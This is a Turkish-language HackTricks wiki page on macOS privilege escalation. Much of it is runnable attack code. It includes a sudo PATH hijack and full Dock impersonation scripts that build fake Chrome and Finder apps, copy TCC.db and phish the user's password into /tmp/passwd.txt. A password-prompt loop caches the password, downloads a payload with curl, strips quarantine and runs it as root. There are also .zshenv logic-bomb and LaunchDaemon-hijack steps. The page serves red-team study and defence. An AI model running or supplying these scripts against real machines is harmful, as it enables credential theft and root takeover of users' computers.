# macOS Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## TCC Yetki Yükseltme

TCC yetki yükseltme hakkında bilgi arıyorsanız şuraya gidin:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Yetki Yükseltme

Linux veya diğer Unix benzeri sistemleri etkileyen birçok yetki yükseltme tekniği macOS için de geçerlidir. Şuraya bakın:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Kullanıcı Etkileşimi

### Sudo Hijacking

Orijinal [Sudo Hijacking tekniğini Linux Yetki Yükseltme gönderisinde](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) bulabilirsiniz.

Ancak macOS, kullanıcı **`sudo`** çalıştırdığında kullanıcının **`PATH`** değerini **korur**. Bu, saldırıyı gerçekleştirmenin başka bir yolunun, kurbanın **sudo çalıştırırken** yürütmeye devam edeceği diğer **binary'leri ele geçirmek** olduğu anlamına gelir:

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Bir kullanıcının terminal kullandığında **Homebrew yüklü olma olasılığının çok yüksek** olduğunu unutmayın. Bu nedenle **`/opt/homebrew/bin`** içindeki binary’leri hijack etmek mümkündür.

### Dock Impersonation

Biraz **social engineering** kullanarak Dock’ta örneğin **Google Chrome’u taklit edebilir** ve aslında kendi script’inizi çalıştırabilirsiniz:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Bazı öneriler:

- Dock’ta Chrome olup olmadığını kontrol edin; varsa bu girdiyi **kaldırın** ve **fake** **Chrome girdisini Dock dizisinde aynı konuma ekleyin**.

<details>
<summary>Chrome Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Bazı öneriler:

- **Finder'ı Dock'tan kaldıramazsınız**, bu yüzden onu Dock'a ekleyecekseniz sahte Finder'ı gerçek olanın hemen yanına koyabilirsiniz. Bunun için **sahte Finder girdisini Dock dizisinin başına eklemeniz** gerekir.
- Başka bir seçenek de onu Dock'a yerleştirmeyip yalnızca açmaktır; "Finder'ın Finder'ı denetlemek istemesi" o kadar da tuhaf değil.
- Korkunç bir kutu göstererek parola sormadan **root yetkilerini elde etmenin** başka bir yolu, Finder'a ayrıcalıklı bir işlem gerçekleştirmek için gerçekten parola sordurmaktır:
  - Finder'dan **`/etc/pam.d`** dizinine yeni bir **`sudo`** dosyası kopyalamasını isteyin (Parola isteyen istemde "Finder sudo dosyasını kopyalamak istiyor" yazacaktır.)
  - Finder'dan yeni bir **Authorization Plugin** kopyalamasını isteyin (Dosya adını kontrol ederek parola isteyen istemde "Finder Finder.bundle dosyasını kopyalamak istiyor" yazmasını sağlayabilirsiniz.)

<details>
<summary>Finder Dock taklit etme betiği</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Parola istemi phishing'i + sudo yeniden kullanımı

Malware, **sudo yetkisine sahip bir parolayı ele geçirmek** ve programatik olarak yeniden kullanmak için sık sık kullanıcı etkileşiminden yararlanır. Yaygın bir akış:

1. `whoami` ile oturum açmış kullanıcıyı belirleyin.
2. `dscl . -authonly "$user" "$pw"` başarı döndürene kadar **parola istemlerini döngüye alın**.
3. Kimlik bilgisini önbelleğe alın (ör. `/tmp/.pass`) ve ayrıcalıklı işlemleri `sudo -S` ile gerçekleştirin (parolayı stdin üzerinden iletin).

Örnek minimal zincir:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Çalınan parola daha sonra **`xattr -c` ile Gatekeeper karantinasını kaldırmak**, LaunchDaemons veya diğer ayrıcalıklı dosyaları kopyalamak ve ek aşamaları etkileşim olmadan çalıştırmak için yeniden kullanılabilir.<sup>[[1]](#references)</sup>

#### Yakalanan parolaları PAM üzerinden doğrulama

Yerel görünümlü, güvenli bir metin istemi aday hesap parolasını toplayabilir ve `dscl`, `security` veya `osascript` başlatmak yerine bunu süreç içinde PAM aracılığıyla doğrulayabilir. Çağıran taraf `pam_start` ile bir PAM işlemi başlatır, bir conversation callback aracılığıyla aday parolayı iletir, `pam_authenticate` çağrısını yapar ve işlemi `pam_end` ile sonlandırır. Doğrulama başarısız olursa parola alanına geri dönülebilir; başarılı olursa ayrı bir doğrulama süreci başlatmadan parolanın doğruluğu teyit edilir. PAM kimlik doğrulaması tek başına çağıran tarafa **ayrıcalık kazandırmaz** veya ayrıcalıklı işlemlere izin vermez.<sup>[[9]](#references)[[10]](#references)</sup>

Giriş parolası ile Keychain parolası eşleşiyorsa yakalanan parola, mevcut Keychain parolasını gerektiren işlemlerde de kullanılabilir; bkz. [Keychain ACL ve partition-list kısıtlamaları](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>

## Daha yeni macOS'e özgü vektörler (2023–2026)

### Kullanımdan kaldırılan `AuthorizationExecuteWithPrivileges` hâlâ kullanılabilir

`AuthorizationExecuteWithPrivileges`, 10.7'de kullanımdan kaldırıldı ancak **Sonoma/Sequoia'da hâlâ çalışıyor**. Birçok ticari güncelleyici, güvenilmeyen bir yol ile `/usr/libexec/security_authtrampoline` çağırır. Hedef binary kullanıcı tarafından yazılabiliyorsa bir trojan yerleştirip meşru istemden yararlanabilirsiniz:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Yukarıdaki **masquerading tricks** ile birleştirerek inandırıcı bir parola penceresi sunun.


### Privileged helper / XPC triage

Modern üçüncü taraf macOS privesc açıklarının çoğu aynı kalıbı izler: **root LaunchDaemon**, **`/Library/PrivilegedHelperTools`** içinden bir **Mach/XPC service** sunar; ardından helper ya **client'ı doğrulamaz**, doğrulamayı **çok geç yapar** (PID race) ya da **user-controlled path/script** kullanan bir **root method** sunar. VPN client'ları, game launcher'lar ve updater'lardaki yakın tarihli birçok helper bug'ının arkasında bu bug sınıfı vardır.<sup>[[2]](#references)</sup>

Hızlı triage kontrol listesi:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Özellikle şu özelliklere sahip helper'lara dikkat edin:

- job `launchd` içinde yüklü kaldığı için **uninstall işleminden sonra** istekleri kabul etmeye devam etmeleri
- script'leri çalıştırmaları veya yapılandırmayı **`/Applications/...`** ya da root olmayan kullanıcıların yazabildiği başka yollardan okumaları
- raceable olabilecek **PID tabanlı** veya yalnızca **bundle-id** kullanan peer doğrulamasına güvenmeleri

Helper authorization bug'ları hakkında daha fazla bilgi için [bu sayfayı](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) inceleyin.

### PackageKit script ortamı mirası (CVE-2024-27822)

Apple **Sonoma 14.5**, **Ventura 13.6.7** ve **Monterey 12.7.5** sürümlerinde düzeltme yapana kadar, kullanıcı tarafından başlatılan **`Installer.app`** / **`PackageKit.framework`** kurulumları, **PKG script'lerini root olarak mevcut kullanıcının ortamında** çalıştırabiliyordu. Bu, **`#!/bin/zsh`** kullanan bir paketin, kurban paketi yüklerken saldırganın **`~/.zshenv`** dosyasını yükleyip root olarak çalıştırabileceği anlamına gelir.<sup>[[3]](#references)</sup>

Bu durum, bir **logic bomb** olarak özellikle ilgi çekicidir: Kullanıcı hesabında bir foothold ve yazılabilir bir shell başlangıç dosyası bulundurmanız yeterlidir; ardından kullanıcının zsh tabanlı herhangi bir güvenlik açığı bulunan installer'ı çalıştırmasını beklersiniz. Bu durum genellikle **MDM/Munki** dağıtımları için geçerli değildir; çünkü bunlar root kullanıcısının ortamında çalışır.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Daha derinlemesine installer-özel kötüye kullanım örnekleri için [bu sayfaya](macos-files-folders-and-binaries/macos-installers-abuse.md) da göz atın.

### `.localized` aracılığıyla installer hedef çakışması

Bazı üçüncü taraf installer’lar, yürütülebilir dosyasına `/Applications/Target.app` içinde sabit bir yolla başvurulan bir root LaunchDaemon kaydeder. Bir saldırgan bu bundle’ı önce **farklı bir bundle identifier** ile oluşturabiliyorsa Installer sahte bundle’ı koruyup gerçek uygulamayı `/Applications/Target.localized/Target.app` konumuna yerleştirebilir. Daemon yine de özgün yolu işaret eder. Bu nedenle, sahte bundle içindeki saldırgan denetimindeki bir yürütülebilir dosya daha sonra root olarak çalıştırılabilir.<sup>[[8]](#references)</sup>

Önemli ön koşullar şunlardır:<sup>[[8]](#references)</sup>

1. Saldırgan beklenen uygulama yolunu oluşturabilir veya denetleyebilir.
2. Paket çakışan bundle’ı kaldırmaz.
3. Ayrıcalıklı iş, bu bundle içinde sabit kodlanmış bir yol kullanır.
4. Kullanıcı veya bir MDM iş akışı paketi yükler ve işi kaydeder.

Yeri değiştirilmiş bundle’ları bulun ve ardından sonraki bölümdeki enumeration döngüsüyle LaunchDaemon hedeflerini inceleyin:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Daha güvenli bir yükleyici, bundle'ın son konumunu çözümler ve ayrıcalıklı yürütülebilir dosyaları `/Library/PrivilegedHelperTools` gibi root sahipliğindeki bir konumda tutar. Ayrıca job'u kaydetmeden veya başlatmadan önce sahipliği ve code signing'i doğrulamalıdır.<sup>[[8]](#references)</sup>

### Yazılabilir LaunchDaemon hedefini ele geçirme

Bir LaunchDaemon plist'i root sahipliğinde olabilirken `Program` veya ilk `ProgramArguments` girdisi kullanıcı tarafından yazılabilir bir dizine işaret ediyor olabilir. Yalnızca yürütülebilir dosyanın izinlerini değil, **yolun tamamını** kontrol edin. Üst dizin yazılabilirse saldırgan, root sahipliğindeki yürütülebilir dosyayı yeniden adlandırıp aynı yola bir ikame dosya oluşturabilir. Job bir sonraki başlatıldığında ikame dosya root olarak çalışır. Yeniden başlatma veya olağan bir servis yeniden başlatması yeterlidir. Saldırganın system domain'de `launchctl bootstrap` çalıştırma iznine ihtiyacı yoktur.<sup>[[7]](#references)</sup>

Önce her hedefi ve doğrudan üst dizinini listeleyin:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Dosya veya üst dizini yazılabilir olduğunda, özgün binary'yi koruyun ve yolu çalıştırılabilir bir payload ile değiştirin. Ardından önceden yüklenmiş daemon'ın yeniden başlamasını bekleyin.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR credential-pointer race (CVE-2025-24118)

Savunmasız `kauth_cred_proc_update` yolu, SMR okuyucuları işaretçiyi kilit kullanmadan yüklerken `proc_ro.p_ucred` değerini atomik olmayan `zalloc_ro_mut` API'siyle güncelliyordu. Herkese açık tetikleyici, özel olarak hazırlanmış bir setgid binary kullanır. Bir thread gerçek ve etkin grup kimlikleri arasında geçiş yaparken başka bir thread, `getgid()` gibi bir syscall'a tekrar tekrar girer.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Bunu hazır bir root exploit olarak değil, **race primitive** olarak değerlendirin. Yayımlanan PoC, parçalanmış bir kimlik bilgisi işaretçisini gösteriyor. Genellikle kernel panic ile sonuçlanıyor. Araştırmacı bozulmayı yalnızca Intel üzerinde yeniden üretti ve ortaya çıkan credential object üzerinde deterministik kontrol sağlayamadı. Apple, macOS 15.3'te güncellemeyi atomik bir pointer exchange olarak değiştirdi.<sup>[[4]](#references)</sup>

### Migration Assistant üzerinden SIP bypass ("Migraine", CVE-2023-32369)

Root erişiminiz olsa bile SIP, sistem konumlarına yazmayı engeller. **Migraine** hatası, Migration Assistant yetkisi `com.apple.rootless.install.heritable`'ı kötüye kullanarak SIP bypass yetkisini devralan bir child process başlatır ve korumalı yolların (ör. `/System/Library/LaunchDaemons`) üzerine yazar.<sup>[[5]](#references)</sup> Saldırı zinciri:

1. Çalışan bir sistemde root erişimi elde edin.
2. Saldırganın denetimindeki bir binary'yi çalıştırmak için `systemmigrationd`'i hazırlanmış bir durumla tetikleyin.
3. SIP tarafından korunan dosyalara yama uygulamak için devralınan yetkiyi kullanın; bu değişiklikler yeniden başlatmadan sonra da kalıcı olur.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 hata sınıfı)

Birden fazla Apple daemon'ı XPC üzerinden **NSPredicate** nesnelerini kabul ediyor ve yalnızca saldırganın kontrolündeki `expressionType` alanını doğruluyor. Keyfi selector'ları değerlendiren bir predicate hazırlayarak **root/system XPC servislerinde kod yürütme** sağlayabilirsiniz (ör. `coreduetd`, `contextstored`). İlk uygulama sandbox escape'i ile birleştirildiğinde, bu **kullanıcıya istem gösterilmeden privilege escalation** sağlar. Predicate'leri deserialize eden ve sağlam bir visitor kullanmayan XPC endpoint'lerini araştırın.<sup>[[6]](#references)</sup>

## TCC - Root Yetki Yükseltme

### CVE-2020-9771 - mount_apfs TCC bypass ve yetki yükseltme

**Herhangi bir kullanıcı** (ayrıcalıksız olanlar bile) `-o noowners` ile bir Time Machine snapshot'ı oluşturup bağlayabilir ve canlı volume'daki sahiplik denetimlerini atlatarak snapshot'taki **TÜM dosyalara erişebilir**. Gerekli tek ayrıcalık, kullanılan uygulamanın (ör. `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) yetkisine sahip olmasıdır.

Komutlar ve açıklamanın tamamı TCC bypasses sayfasında:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Hassas Bilgiler

Bunlar yetki yükseltmek için kullanılabilir:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Pentest Partners - 2025, infostealer'ların yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: macOS için AWS Client VPN Yerel Yetki Yükseltme](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Yetki Yükseltme](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - macOS ve iOS'ta yeni bir yetki yükseltme hata sınıfı (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking: güvenli olmayan klasör izinleri üzerinden yetki yükseltme ve kalıcılık](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS'ta .localized dizini üzerinden LPE](https://theevilbit.github.io/posts/localized/)
- [9] [Jamf Threat Labs - PamStealer: pano yöneticisi uygulaması gibi görünen macOS zararlısı](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
- [10] [Kaspersky Securelist - MacSync mercek altında](https://securelist.com/macsync-new-version/121383/)
